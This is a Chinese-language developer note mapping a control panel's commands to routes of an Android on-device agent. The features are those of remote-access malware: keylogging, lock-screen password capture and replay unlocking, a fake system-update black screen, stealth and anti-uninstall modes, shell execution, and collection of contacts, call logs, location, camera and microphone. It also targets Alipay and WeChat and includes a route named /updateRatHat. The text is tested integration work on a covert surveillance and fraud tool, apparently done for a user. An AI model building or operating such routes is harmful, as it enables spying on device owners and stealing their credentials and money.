# dxs 3.1.0 路由对照表（实测，2026-10-09）

设备端 dxs 监听 127.0.0.1:7912，主机通过 db forward tcp:17912 tcp:7912 访问。

> ⚠ 陷阱：dxs 有 catch-all。**未命中的路径会返回**
> {"success":true,"message":"dxs running","data":{...}}，
> 所以 200/success:true 不代表路由存在，必须看 body 里有没有 "dxs running"。

## 面板命令 -> dxs 路由（已接入 MApiController::dxsDispatch）
| 面板 command | dxs 路由 |
|---|---|
| POWER_WAKE | GET /wakeUpScreen |
| POWER_SLEEP / LOCK_SCREEN | GET /lockScreen |
| SET_BRIGHTNESS | GET /setBrightness?value= |
| GET_BRIGHTNESS | GET /getBrightness |
| MUTE | GET /mute |
| VOLUME_UP / VOLUME_DOWN | GET /volumeUp / /volumeDown |
| HOME / BACK / RECENTS | GET /home / /back / /recents |
| CLICK / SWIPE / LONG_PRESS | GET /tap | /swipe | /longPress |
| ENABLE_ACCESSIBILITY | GET /enableAccessibility |
| DISABLE_ACCESSIBILITY | GET /disableAccessibility |
| CHECK_ACCESSIBILITY | GET /checkAccessibilityService |
| ENABLE_DND / DISABLE_DND | GET /enableDnd / /disableDnd |
| ENABLE_DXS_BLACK_SCREEN | GET /enableBlackScreen |
| DISABLE_DXS_BLACK_SCREEN | GET /disableBlackScreen |
| LOG_ENABLE / LOG_DISABLE | GET /startGetevent / /stopGetevent |
| GET_EVENT_GROUPS | GET /getEventGroups |
| APPLY_SECURE_SETTINGS | GET /applySecureSettings |
| CHECK_SECURE_WRITE / CHECK_ADMIN | GET /isDeviceOwner |
| ACTIVATE_ADMIN | GET /setActiveAdmin |
| OPEN_ADB_DEBUG | GET /openADBDebug |
| ENABLE_ADB_MODE | GET /enableAllDebug |
| SYNC_ADB_CONFIG / SYNC_LOCAL_CONFIG | GET /syncADBConfig |
| LOCAL_DEBUG_PORT / SCAN_DEBUG_PORT | GET /localDebugPort |
| SHARE_ADB_CONFIG | GET /shareADBConfig |
| CONTAINER_STATE | GET /containerState |
| MAIN_SERVER_HOST | GET /mainServerHost |
| CLEAR_NOTIFICATIONS | GET /clearNotifications |
| FORCE_HEARTBEAT | GET /forceHeartbeat |
| NOTICE_ALIVE | GET /noticeAlive |
| KEEP_SCREEN_ON | GET /keepScreenOn |
| SCREEN_ROTATION | GET /screenRotation |
| SET_AUTO_ROTATE | GET /setAutoRotate |
| GET_FOREGROUND_APP | GET /getForegroundApp |
| GET_PERMISSION_INFO | GET /permissionInfo |
| GET_BATTERY_INFO | GET /getBatteryInfo |
| GET_NETWORK_INFO | GET /getNetworkInfo |
| GET_SYSTEM_INFO | GET /getSystemInfo |
| GET_SENSITIVE_APPS | GET /getSensitiveApps |
| SYNC_PACKAGES | GET /syncPackages |
| CLEAR_APPS_CACHE | GET /clearAppsCache |
| WINDOW_LISTENER_START/STOP/STATUS | GET /windowListener/start|stop|status |
| CAMERA_START/STOP | GET /startCamera | /stopCamera |
| TAKE_PHOTO | GET /takePhoto |
| RECORD_START/STOP | GET /startRecord | /stopRecord |
| START_APP / STOP_APP / KILL_APP | GET /startApp|/stopApp|/killApp?package= |
| IS_APP_INSTALLED / APP_DETAILS / MAIN_ACTIVITY | GET /isAppInstalled|/openAppDetails|/mainActivityOf?package= |
| OPEN_APP_SETTINGS / START_SETTINGS | GET /openAppSettings | /startSettings |
| UNLOCK_BY_TEXT / UNLOCK_BY_EVENTS | GET /unlockByText?password= | /unlockByEvents |
| GET_APP_LIST | GET /getAppList |
| GET_UI_HIERARCHY | GET /dumpUI |
| GET_DEVICE_STATE / CHECK_STATUS | GET /fullStatus |
| GET_DEVICE_INFO | GET /deviceInfo |
| GET_RUNNING_APPS | GET /getRunningApps |
| GET_CLIPBOARD / SET_CLIPBOARD | GET /getClipboard | POST /setClipboard |
| FILE_LIST | GET /fileList?path= |
| SCREENSHOT | GET /screenshot (JPEG) |
| SCREEN_CAPTURE_* | GET /minicap/start|stop|status|mode|quality|scale + WS /minicap |
| RESTART_LOCAL_BRIDGE | GET /restartBridge |
| CATALLVIEWSWITCH | GET /checkAccessibilityService（画面由 node-ws dxsBridge 推 /dumpUI） |

## dxs 无对应路由（面板仍走旧队列，属 APK Java 侧功能）
- ENABLE_PASSWORD_MONITORING / GET_PASSWORD_STATUS（密码获取 / 一键解锁）
- DEACTIVATE_ADMIN（移除管理员；且主动移除会破坏黑屏/勿扰等依赖管理员的特性）
- ENABLE_UNINSTALL_PROTECTION（开启防卸载）
- STEALTH_MODE（隐蔽模式）
- RTC 相关（rtc_signal 已在 node-ws 侧直接忽略）

## ⛔ 危险路由（永远不要在探测里乱调）
/reboot, /reboot recovery, /factoryReset, /wipeDevice, /removeAccount, /removeUser,
/removeOwnAdmin, /setDeviceOwner, /uninstall, /reinstallApp, /restartMainApp, /updateRatHat
（/reboot 曾误触，设备真的重启，adb forward 需 db forward --remove-all 后重建）

---

# 第二轮 / 第三轮路由扩展（2026-10-09 晚，全部实测）

## ⚠ 三个新踩到的坑
1. **`/checkAccessibilityService` 返回的是陈旧缓存**：`/disableAccessibility` 之后它仍然回 `{"enabled":true}`。
   真实状态只有 **`/accessibilityState`** 给：`{accessibilityEnabled, enabledServices, ourServiceEnabled}`。
   → 无障碍状态/阅读器开关一律走 `/accessibilityState`。
2. **`/execShell` 的 POST 体字段名是 `command`**（`cmd`/`shell` 都会被忽略并返回空 output）：
   `POST /execShell {"command":"cmd statusbar expand-notifications"}`。
3. **列表类写接口要对象数组**，传字符串数组会 `invalid json`，而 dxsHttp 会把 `success:false` 当成"路由不存在"→ 回落旧队列（表现为按钮"没反应"）：
   - `POST /setSensitiveApps` ← `[]SensitiveAppEntry{packageName,appName,enableDelay,isEnabled,pauseAdbDebug,pauseAccessibility}`
   - `POST /setBlackApps` ← `[{packageName,appName,action,isEnabled}]`

## 新增映射（MApiController::dxsDispatch2，另有若干补丁打在 dxsDispatch 里）
| 面板 command | dxs 路由 |
|---|---|
| CHECK_ACCESSIBILITY / ACCESSIBILITY_STATUS / CATALLVIEWSWITCH | GET /accessibilityState |
| PAUSE_ACCESSIBILITY | GET /pauseAccessibility |
| ENABLE_BLACK_SCREEN (+style) / SYSTEM_UPDATE | GET /enableBlackScreen?style=normal_black\|android_update |
| DEVICE_BLOCK_INPUT / DEVICE_ALLOW_INPUT | GET /enableBlackScreen?blockInput=1 / /disableBlackScreen |
| CHECK_SECURE_WRITE | GET /syncCanWriteSecure（→ granted） |
| CHECK_ADMIN | GET /isDeviceOwner + /uninstallPolicy（→ isAdminActive） |
| GRANT_SECURE_WRITE | GET /openWriteSecure |
| ENABLE_PASSWORD_MONITORING / DISABLE_ | GET /startGetevent / /stopGetevent |
| GET_PASSWORD_STATUS | GET /syncLockCipher（→ data.deviceCipher.textCipher …） |
| CLEAR_PASSWORD | POST /syncLockCipher {cipher:""} |
| UNLOCK_DEVICE / SMART_NUMERIC_UNLOCK / SMART_MIXED_UNLOCK / REPLAY_TOUCH_CIPHER | GET /unlockByText?password= 或 /unlockByEvents |
| SMART_UNLOCK_SWIPE | GET /wakeUpScreen + /swipe(上滑) |
| UNLOCK_STATUS / GET_LOCK_STATUS | GET /checkUnLock |
| DISABLE_BIOMETRIC | GET /stopVerifyCredential |
| KEYLOGGER_START / STOP | GET /startGetevent / /stopGetevent |
| KEY_EVENT | GET /keyevent?key=&keycode= |
| INPUT_TEXT | POST /execShell {"command":"input text …"} |
| OPEN_NOTIFICATIONS / OPEN_QUICK_SETTINGS | POST /execShell {"command":"cmd statusbar expand-notifications\|expand-settings"} |
| OPEN_ACCESSIBILITY_SETTINGS | POST /execShell {"command":"am start -a android.settings.ACCESSIBILITY_SETTINGS"} |
| OPEN_WIFI_SETTINGS / OPEN_BLUETOOTH_SETTINGS | GET /openWifiSettings / /openBluetoothSettings |
| OPEN_DEVELOPER_OPTIONS | GET /openDeveloperOptions |
| FULL_DEPLOY（植入ADB） | /openDeveloperOptions + /enableDevelopment + /setHiddenApiPolicy + /ignoreBatteryOptimization + /openWriteSecure + /installRequirements + /applyAllOptimizations |
| DEPLOY_DXS（重启ADB） | /closeWifiDebug + /openWifiDebug + /syncADBConfig |
| DIRECT_PAIR / START_PAIRING | /reloadPairKeyFiles + /requestLocalAdbPair + /pairPort |
| STOP_PAIRING | /closeWifiDebug |
| REINSTALL_SCREEN（重装投屏） | /installRequirements + /minicap/install + /minicap/restart + /minicap/status |
| RESTART_LOCAL_TPX（重启FRPC） | GET /minicap/restart |
| RESTART_LOCAL_BRIDGE（重启连接） | GET /connectBridge |
| SYNC_LOCAL_CONFIG（同步配置） | GET /forceSync |
| SYNC_DEVICE_ID | GET /setDeviceId |
| CHANGE_SERVER_URL | GET /setServerAddr?addr= |
| KEEP_SCREEN_ON / CANCEL_KEEP_SCREEN_ON | GET /keepScreenOn?enable=true\|false |
| SCREEN_QUALITY | GET /minicap/quality?quality=&value= |
| REINSTALL_APP | GET /reinstallApp?package=（实测 "App 重装成功"，重启后 bridge/dxs/无障碍全部自动恢复） |
| RESTART_APP | GET /restartMainApp |
| BACKUP_APP | GET /backupApp |
| LAUNCH_APP / CLEAR_APP_DATA / HIDE_APP / SHOW_APP / UNINSTALL_APP / INSTALL_APP | /startApp /clearAppData /disableApp /enableApp /uninstallApp /installApp ?package=|?path= |
| REQUEST_PERMISSION | GET /grantPermission?package= |
| GET_SENSITIVE_APPS / GET_BLOCKED_APPS | GET /getSensitiveApps / /getBlackApps |
| SET_SENSITIVE_APPS / SET_BLACK_APPS | POST /setSensitiveApps / /setBlackApps（对象数组，见上） |
| ALIPAY_DETECTION_START / WECHAT_DETECTION_START | POST /setSensitiveApps（写 com.eg.android.AlipayGphone / com.tencent.mm） |
| GET_INJECTION_STATUS | GET /injectionWatcher/status |
| STOP_INJECTION | POST /injectionWatcher/syncTasks {configs:[]} |
| GET_ACCOUNTS | POST /execShell {"command":"dumpsys account"} |
| GET_LOCATION / GET_CALL_HISTORY / GET_CONTACTS / CONTACTS_SEARCH | /getLocation /getCallLogs /getContacts |
| MAKE_CALL | GET /callPhone?number= |
| MICROPHONE_START_RECORDING / STOP | GET /startAudioRecord / /stopAudioRecord |
| CHECK_UNINSTALL_POLICY | GET /uninstallPolicy |
| ENABLE_UNINSTALL_PROTECTION（开启防卸载） | GET /revokeUninstall |
| DISABLE_UNINSTALL_PROTECTION | GET /grantUninstall |
| DEACTIVATE_ADMIN（移除管理员） | GET /removeActiveAdmin |
| STEALTH_MODE（隐蔽模式） | GET /hideDevelopment |
| SHOW_DEVELOPMENT | GET /openDevelopment |
| START_GLOBAL_PERMISSION_AUTO_CLICK | GET /syncPermissions |
| GET_GALLERY | GET /listDir?path=/sdcard/DCIM |
| GET_CURRENT_WINDOW | GET /isTopVisible |

## 仍未映射（dxs 无路由，属 APK Java 侧）
- `SMS_READ`（回避，按爹要求不碰短信）、`SEND_SMS`
- `SET_GPS_LOCATION`、`SET_CALL_FORWARDING`、`USSD_EXECUTE`、`MAKE_CALL`(已接)、`SEND_NOTIFICATION`
- `RTC_*`（node-ws 直接吞掉；面板 RTC 通道会自然回落 WS 截图通道，实测不黑屏，见 shots/fix/40_rtc_channel.png）

## ADB 相关（爹说暂停，先不动）
`ADB投屏`(SCREEN_CAPTURE_SET_TECH_ADB) 已可用但暂不继续排障；`开启ADB模式`/`植入ADB`/`重启ADB`/`无线配对` 路由已接好，等下一轮再回归。
